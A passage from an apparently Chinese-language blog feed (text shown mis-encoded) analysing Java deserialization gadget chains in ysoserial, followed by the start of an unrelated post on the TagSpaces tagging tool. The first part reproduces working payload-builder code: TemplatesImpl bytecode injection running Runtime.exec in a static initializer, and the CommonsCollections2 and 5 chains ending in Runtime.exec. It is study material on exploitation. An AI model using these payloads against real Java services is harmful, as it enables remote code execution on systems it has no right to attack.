è¿›è¡Œä¸€æ¬¡æ¯”è¾ƒï¼Œå¦‚æœä¸€å¼€å§‹æ”¾çš„ templates æ— æ³•æ·»åŠ  proxy</span></span><br><span class="line"></span><br><span class="line">Reflections.setFieldValue(templates, <span class="string">&quot;_auxClasses&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">Reflections.setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ”¾å…¥å®é™…çš„ valueï¼ˆæ›¿æ¢ï¼‰</span></span><br><span class="line">map.put(zeroHashCodeStr, templates); <span class="comment">// swap in real object</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> set;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ysoserial.payloads.util.Gadgets ä½¿ç”¨ javaassist åº“åˆ›å»ºåŒ…å«æ¶æ„ä»£ç çš„ç±»ï¼Œæ¶æ„ä»£ç å¯ä»¥åœ¨æ— å‚æ„é€ å‡½æ•°æˆ– static block ä¸­ï¼Œå°†æ¶æ„ä»£ç æ·»åŠ åˆ° TemplatesImpl çš„ <code>_bytecodes</code> å˜é‡ä¸­ï¼Œç­‰ååºåˆ—åŒ–æ—¶è°ƒç”¨ <code>getOutputProperties()</code> æˆ– <code>newTransformer()</code> è§¦å‘æ¶æ„ä»£ç æ‰§è¡Œã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( Boolean.parseBoolean(System.getProperty(<span class="string">&quot;properXalan&quot;</span>, <span class="string">&quot;false&quot;</span>)) ) &#123;</span><br><span class="line">        <span class="keyword">return</span> createTemplatesImpl(</span><br><span class="line">            command,</span><br><span class="line">            Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;</span>),</span><br><span class="line">            Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.runtime.AbstractTranslet&quot;</span>),</span><br><span class="line">            Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory )</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> T templates = tplClass.newInstance();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// use template gadget class</span></span><br><span class="line">    ClassPool pool = ClassPool.getDefault();</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload.class));</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(abstTranslet));</span><br><span class="line">    <span class="keyword">final</span> CtClass clazz = pool.get(StubTransletPayload.class.getName());</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// run command in static initializer</span></span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections</span></span><br><span class="line">    String cmd = <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> +</span><br><span class="line">        command.replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;\\\\&quot;</span>).replace(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>) +</span><br><span class="line">        <span class="string">&quot;\&quot;);&quot;</span>;</span><br><span class="line">    clazz.makeClassInitializer().insertAfter(cmd); <span class="comment">// åˆ›å»º static block</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)</span></span><br><span class="line">    clazz.setName(<span class="string">&quot;ysoserial.Pwner&quot;</span> + System.nanoTime());</span><br><span class="line">    CtClass superC = pool.get(abstTranslet.getName());</span><br><span class="line">   clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–å­—èŠ‚ç </span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// inject class bytes into instance</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;</span><br><span class="line">        classBytes, ClassFiles.classAsBytes(Foo.class)</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¾ç½®è¿›å…¥ defineTransletClasses() çš„æ¡ä»¶</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Pwnr&quot;</span>); <span class="comment">// å¿…é¡»å¡«å……</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, transFactory.newInstance()); <span class="comment">// å¯é€‰</span></span><br><span class="line">    <span class="keyword">return</span> templates;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h3><blockquote><p> åˆ©ç”¨ TemplatesImpl æ‰¿è½½æ¶æ„è°ƒç”¨é“¾<br> PriorityQueue åœ¨ååºåˆ—åŒ–æ—¶æ¯”è¾ƒå…ƒç´ ï¼ˆæ¢å¤é¡ºåºï¼‰ï¼Œè€Œæ¯”è¾ƒæ“ä½œå¯ä»¥è‡ªå®šä¹‰<br> åˆ©ç”¨ InvokerTransformer æ„é€ æ¯”è¾ƒæ“ä½œï¼Œåœ¨æ¯”è¾ƒæ—¶è§¦å‘ transform æ“ä½œï¼Œè¿›ä¸€æ­¥è§¦å‘ TemplatesImpl</p></blockquote><p>é€‚ç”¨ç‰ˆæœ¬</p><ul><li>commons-collections 4.0<ul><li>CommonsCollections1 å¯ä»¥åœ¨è¯¥ç‰ˆæœ¬å¤ç°ï¼Œæ”¹ä¸º <code>Map lazyMap = LazyMap.lazyMap(innerMap,transformerChain);</code> è®¾ç½® factory</li></ul></li><li>jdk7u21<ul><li>ä½¿ç”¨ TemplatesImpl çš„å˜é‡ <code>_bytecodes</code> æ‰¿è½½æ¶æ„å­—èŠ‚ç </li></ul></li></ul><p>åˆ©ç”¨é“¾</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">PriorityQueue.readObject()</span><br><span class="line">...</span><br><span class="line">TransformingComparator.compare()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/09/16/rP7TSdGYfbiRmD2.png" ><p>ysoserial.payloads.CommonsCollections2 åˆ›å»º PriorityQueue å¯¹è±¡ï¼Œå¹¶å°†å…¶ comparator è®¾ç½®ä¸ºåŒ…å«æ¶æ„ transformer å¯¹è±¡çš„ TransformingComparatorã€‚</p><p>PriorityQueue ååºåˆ—åŒ–æ—¶æœ€åä¼šè°ƒç”¨ <code>heapify -&gt; siftDown</code>ï¼ˆå°†æ— åºé˜Ÿåˆ—è¿˜åŸä¸ºä¼˜å…ˆé˜Ÿåˆ—ï¼‰ï¼Œ å½“ comparator ä¸ä¸ºç©ºæ—¶è¿›ä¸€æ­¥è°ƒç”¨ <code>siftDownUsingComparator -&gt; conparator.compare</code>  æœ€ç»ˆé€šè¿‡è°ƒç”¨ <code> transformer.transform(TemplatesImpl)</code>å®ç° RCEã€‚</p><ul><li><code>PriorityQueue.heapify()</code> ç”¨äºæ„é€ äºŒå‰å †</li><li><code>InvokerTransformer.transform(TemplatesImpl) -&gt; TemplatesImpl.newTransformer()</code></li></ul><p>TemplatesImpl ç±»ä¸»è¦çš„ä½œç”¨ä¸ºï¼š</p><ul><li>ä½¿ç”¨ <code>_bytecodes</code> æˆå‘˜å˜é‡å­˜å‚¨æ¶æ„å­—èŠ‚ç  ( æ¶æ„ class -&gt; byte array )</li><li>æä¾›åŠ è½½æ¶æ„å­—èŠ‚ç å¹¶è§¦å‘æ‰§è¡Œçš„å‡½æ•°ï¼ŒåŠ è½½åœ¨ <code>defineTransletClasses()</code> æ–¹æ³•ä¸­ï¼Œæ–¹æ³•è§¦å‘ä¸º <code>getOutputProperties()</code> æˆ– <code>newTransformer()</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Queue&lt;Object&gt; <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// æ„é€  TemplatesImpl</span></span><br><span class="line"><span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line">    </span><br><span class="line"><span class="comment">// å‡çš„æ–¹æ³•åç§° toString</span></span><br><span class="line"><span class="keyword">final</span> InvokerTransformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>], <span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨ transformer æ„é€  PriorityQueue</span></span><br><span class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>,<span class="keyword">new</span> TransformingComparator(transformer));</span><br><span class="line">    </span><br><span class="line"><span class="comment">// å…ˆè®¾ç½®æ­£å¸¸çš„å˜é‡å€¼</span></span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¿®æ”¹æ–¹æ³•åç§°</span></span><br><span class="line">Reflections.setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ›¿æ¢é˜Ÿåˆ—å†…çš„å˜é‡</span></span><br><span class="line"><span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">queueArray[<span class="number">0</span>] = templates; <span class="comment">// jdk7u21</span></span><br><span class="line">queueArray[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> queue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h3><blockquote><p>å‰é¢ RMI ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨å°±æ˜¯ç”¨çš„è¿™ä¸ª<br>å°† CC1 ä¸­çš„ AnnotationInvocationHandler æ›¿æ¢ä¸º BadAttributeValueExpException<br>åˆ©ç”¨ CC1 ä¸­çš„ LazyMap æ„é€  TiedMapEntryï¼Œå†ç”¨äºæ„é€  BadAttributeValueExpException</p></blockquote><p>é€‚ç”¨ç‰ˆæœ¬</p><ul><li>commons-collections 3.1 ~ 3.2.1</li><li>jdk 1.8</li></ul><p>åˆ©ç”¨é“¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    ObjectInputStream.readObject()</span><br><span class="line">        BadAttributeValueExpException.readObject()</span><br><span class="line">            TiedMapEntry.toString()</span><br><span class="line">                LazyMap.get()</span><br><span class="line">                    ChainedTransformer.transform()</span><br><span class="line">                        ConstantTransformer.transform()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Class.getMethod()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Runtime.getRuntime()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Runtime.exec()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/09/16/4tevUmukcFwMQT1.jpg" ><p>åœ¨ BadAttributeValueExpException çš„ readObject æ–¹æ³•ä¸­ï¼Œä¼šè°ƒç”¨æˆå‘˜å˜é‡ <code>val</code> çš„ <code>toString</code> æ–¹æ³•</p><ul><li>è¿™é‡Œå°† <code>val</code> è®¾ç½®ä¸º TiedMapEntry</li><li>TiedMapEntry ä¼šè°ƒç”¨è‡ªèº«çš„ <code>getKey</code> å’Œ <code>getValue</code> æ–¹æ³•<ul><li><code>getKey</code> æ–¹æ³•ä¸­è°ƒç”¨æˆå‘˜å˜é‡ map çš„ <code>get</code> æ–¹æ³•</li><li>è¿™é‡Œå°† map è®¾ç½®ä¸º LazyMapï¼ˆ@CC1ï¼‰</li></ul></li></ul><p>ysoserial.payloads.CommonsCollections5 æ³¨æ„è¿™é‡Œåˆ©ç”¨åå°„è®¾ç½® <code>val</code> çš„å€¼ï¼Œå› ä¸º BadAttributeValueExpException çš„æ„é€ å‡½æ•°ä¼šåˆ¤æ–­æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ä¸ºç©ºåœ¨åºåˆ—åŒ–æ—¶å°±ä¼šæ‰§è¡Œ <code>toString()</code>ï¼Œé‚£ä¹ˆååºåˆ—åŒ–æ—¶ï¼Œå› ä¸ºä¼ å…¥çš„ entry å·²ç»æ˜¯å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å°±ä¸ä¼šè§¦å‘ toString æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> BadAttributeValueExpException <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// æ„é€ æ¶æ„è°ƒç”¨é“¾ ChainedTransformer</span></span><br><span class="line"><span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; command &#125;;</span><br><span class="line"><span class="comment">// inert chain for setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line">        <span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line"><span class="comment">// real chain for after setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line"><span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line"><span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line"><span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line"><span class="keyword">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line"><span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ„é€  LazyMapï¼Œå°†å…¶ factory å˜é‡è®¾ç½®ä¸º ChainedTransformer</span></span><br><span class="line"><span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"><span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ä½¿ç”¨ LazyMap æ„é€  TiedMapEntry</span></span><br><span class="line">TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°† BadAttributeValueExpException çš„æˆå‘˜å˜é‡ val è®¾ç½®ä¸º TiedMapEntry</span></span><br><span class="line">BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">Field valfield = val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">    Reflections.setAccessible(valfield);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// åˆ©ç”¨åå°„èµ‹å€¼</span></span><br><span class="line">valfield.set(val, entry);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°† ChainedTransformer ä¸­çš„ transformer æ•°ç»„æ›¿æ¢ä¸ºæ¶æ„è°ƒç”¨åºåˆ—</span></span><br><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="å‚é˜…"><a href="#å‚é˜…" class="headerlink" title="å‚é˜…"></a>å‚é˜…</h1><ul><li><a href="https://www.anquanke.com/post/id/201762">JAVAååºåˆ—åŒ–-ysoserial-URLDNS</a></li><li><a href="https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/">Triggering a DNS lookup using Java Deserialization</a></li><li><a href="https://gist.github.com/frohoff/24af7913611f8406eaf3">Security Advisory â€“ Java SE</a></li><li><a href="https://b1ngz.github.io/java-deserialization-jdk7u21-gadget-note/">Javaååºåˆ— Jdk7u21 Payload å­¦ä¹ ç¬”è®°</a></li></ul>]]></content>
    
    
    <summary type="html">å…¥é—¨ä¸€ä¸‹ Java ååºåˆ—åŒ–æ¼æ´ï¼Œæ¢³ç† ysoserial ä¸­å‡ ä¸ªçš„ POC</summary>
    
    
    
    <category term="Security" scheme="https://jckling.github.io/categories/Security/"/>
    
    
    <category term="Java" scheme="https://jckling.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>æ–‡ä»¶æ ‡ç­¾å·¥å…· TagSpaces ä½¿ç”¨</title>
    <link href="https://jckling.github.io/2021/09/09/Other/%E6%96%87%E4%BB%B6%E6%A0%87%E7%AD%BE%E5%B7%A5%E5%85%B7%20TagSpaces%20%E4%BD%BF%E7%94%A8/"/>
    <id>https://jckling.github.io/2021/09/09/Other/%E6%96%87%E4%BB%B6%E6%A0%87%E7%AD%BE%E5%B7%A5%E5%85%B7%20TagSpaces%20%E4%BD%BF%E7%94%A8/</id>
    <published>2021-09-09T06:10:54.000Z</published>
    <updated>2021-10-11T13:39:04.665Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä¹‹å‰ç© mod ä¸‹è½½äº†ä¸€å¤§å †æè´¨æ–‡ä»¶å’ŒåŠ¨ä½œæ–‡ä»¶ï¼Œä½†æ˜¯ä¸‹è½½çš„æ–‡ä»¶å¹¶æ²¡æœ‰æŒ‰ç…§ç½‘ç«™ä¸Šçš„ id ç»Ÿä¸€æ–‡ä»¶å¤¹åç§°ï¼Œç»“æœå°±æ˜¯å„ç§å„æ ·çš„æ–‡ä»¶å¤¹åç§°ï¼Œå®Œå…¨çœ‹ä¸å‡ºæ¥å†…å®¹åˆ°åº•æ˜¯ä»€ä¹ˆï¼Œè€Œä¸”ä¹Ÿä¸çŸ¥é“æŸäº›ç§æ—èƒ½ä¸èƒ½ç”¨â€¦</p><p><img src="https://i.loli.net/2021/09/09/HrSD3Rj9g7Ew4Wq.png" style="zoom:80%;" /> <br /></p><p>åæ¥æ˜¯æ‰“ç®—ç›´æ¥çˆ¬ <a href="https://www.xivmodarchive.com/">ffxivmodarchive</a> ç½‘ç«™ä¸Šçš„ mod ä¿¡æ¯ï¼Œç„¶ååœ¨æœ¬åœ°æµè§ˆï¼Œæä¾›é¢„è§ˆã€æ˜¯å¦å·²ä¸‹è½½å’Œå…¶ä»–å„ç§æ ‡ç­¾ï¼ˆç§æ—ã€æ€§åˆ«ç­‰ï¼‰ã€‚ä½†æ˜¯åšä¸€åŠå‘ç°æœ‰ç‚¹åšä¸åŠ¨ï¼ˆ<a href="https://github.com/jckling/ffxiv-modarchive">jckling/ffxiv-modarchive</a>ï¼‰ï¼šâ‘  éœ€è¦æ¯å¤©åŒæ­¥ç½‘ç«™ä¸Šçš„æ•°æ®ï¼›â‘¡ ä¸‹è½½åœ°å€å¯èƒ½å¤–é“¾åˆ°è°·æ­Œäº‘ç«¯ç¡¬ç›˜ï¼Œéœ€è¦æ‰‹åŠ¨å°†ä¿å­˜çš„æ–‡ä»¶å¤¹åç§°æ”¹ä¸º idï¼›â‘¢ å‰ç«¯å±•ç¤ºé¡µé¢ä¸å¥½å†™ã€‚</p><p>å››èˆäº”å…¥ä¸Šé¢çš„åŠŸèƒ½å°±æ˜¯â€œåå‘ä»£ç†â€åŠ ä¸€ä¸ªæ˜¯å¦å·²ä¸‹è½½çš„è®°å½•è€Œå·²ï¼Œåšèµ·æ¥å¥½éº»çƒ¦äºæ˜¯æç½®äº†ï¼ˆæ‘Šæ‰‹</p><p>æ˜¨å¤©èŠ±äº†ç‚¹æ—¶é—´æ‰¾æ‰“æ ‡ç­¾çš„å·¥å…·ï¼Œæœ‰ä¸€ä¸ª <a href="https://github.com/files-community/Files">Files</a> æ–‡ä»¶æµè§ˆå·¥å…·æ”¯æŒæ‰“æ ‡ç­¾ï¼Œä½†æ˜¯ä»å¾®è½¯åº”ç”¨å•†åº—é‡Œä¸‹è½½çš„æ˜¯ 1.x ç‰ˆæœ¬ï¼Œæš‚ä¸æ”¯æŒæ ‡ç­¾åŠŸèƒ½ ğŸ˜…ã€‚å…¶ä»–çš„æœ‰ <a href="https://www.tagflow.ch/en/">TagFlow</a>ã€<a href="https://alltags.net/">allTags</a>ã€<a href="https://www.tagspaces.org/">TagSpaces</a>ã€<a href="https://www.taglyst.com/">tagLyst</a>ï¼Œç›´æ¥æ ¹æ® UI çš„å–œå¥½é€‰äº† TagSpaces ç”¨ï¼ŒåŠŸèƒ½ä¹Ÿæ˜¯å¤Ÿçš„ã€‚</p><h1 id="TagSpaces"><a href="#TagSpaces" class="headerlink" title="TagSpaces"></a>TagSpaces</h1><p>è·¨å¹³å°æ‰“æ ‡ç­¾å·¥å…·ï¼Œæ”¯æŒå¯¹æ–‡ä»¶å’Œæ–‡ä»¶å¤¹æ‰“æ ‡ç­¾ã€åŠ æ³¨è§£ï¼›æ”¯æŒæ–‡æœ¬æœç´¢å’Œæ ‡ç­¾æœç´¢ï¼ˆå¸ƒå°”è¿ç®—ï¼‰ï¼›é›†æˆé¢„è§ˆå’Œç¼–è¾‘åŠŸèƒ½ã€‚</p><p>ä¸‹è½½åœ°å€ï¼š</p><ul><li>å®˜ç½‘ï¼š<a href="https://www.tagspaces.org/downloads/">https://www.tagspaces.org/downloads/</a></li><li>Githubï¼š<a href="https://github.com/tagspaces/tagspaces/releases">https://github.com/tagspaces/tagspaces/releases</a></li></ul><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p>ä»å®˜ç½‘ä¸‹è½½ 64 ä½çš„ installer</p><p><img src="https://i.loli.net/2021/09/09/WTKhz4ZfGlLgU8D.jpg" style="zoom:80%;" /><br /></p><p>é€‰æ‹©ä¸ºä»»ä½•äººå®‰è£…ï¼ˆæˆ‘è¿™é‡Œå·²ç»å®‰è£…è¿‡äº†ï¼‰</p><p><img src="https://i.loli.net/2021/09/09/nSW6aodrHus9X7Q.jpg" style="zoom: 75%;" /><br /></p><p>åŒæ„è®¸å¯è¯åè®®åï¼Œç„¶åï¼Œæ‰§è¡Œå®‰è£…</p><p><img src="https://i.loli.net/2021/09/09/32OvhnMu8Ycx49g.jpg" style="zoom:75%;" /><br /></p><p>ç¬¬ä¸€æ¬¡æ‰“å¼€éœ€è¦é€‰æ‹©æ ‡ç­¾çš„ä¿å­˜æ–¹å¼ï¼Œä¹Ÿå¯ä»¥åœ¨è®¾ç½®é‡Œä¿®æ”¹</p><ul><li>é‡å‘½åæ–‡ä»¶ï¼ˆRENAME FILEï¼‰</li><li>é¢å¤–æ–‡ä»¶ï¼ˆUSE SIDECAR FILEï¼‰</li></ul><p>å¦å¤–ï¼Œå¯ä»¥åœ¨è®¾ç½®é‡Œé€‰æ‹©ä¸­æ–‡</p><img src="https://i.loli.net/2021/09/09/e5JglQmKXhdaMzj.jpg" style="zoom:60%;" /><h2 id="ç•Œé¢"><a href="#ç•Œé¢" class="headerlink" title="ç•Œé¢"></a>ç•Œé¢</h2><p>è¿™äº›ç•Œé¢åœ¨æµè§ˆæ–‡ä»¶æ—¶ä¸ä¸€å®šéƒ½æœ‰ï¼Œå¯ä»¥é€šè¿‡è®¾ç½®æ›´æ”¹æ˜¯å¦æ˜¾ç¤ºï¼Œæ¯ä¸ªåŒºåŸŸå…·ä½“çš„åŠŸèƒ½å°±ä¸å±•å¼€äº†ï¼Œçœ‹å®˜æ–¹æ–‡æ¡£å°±å¥½ã€‚</p><ol><li>å‚ç›´å·¥å…·æ ï¼šå§‹ç»ˆå¯è§ï¼Œæä¾›å¯¹åº”ç”¨ç¨‹åºä¸»è¦éƒ¨åˆ†çš„å¿«é€Ÿè®¿é—®</li><li>ä½ç½®ç®¡ç†å™¨/æ ‡ç­¾åº“/æœç´¢åŒºåŸŸï¼šç®¡ç†å…³è”çš„ä½ç½®ï¼Œæ 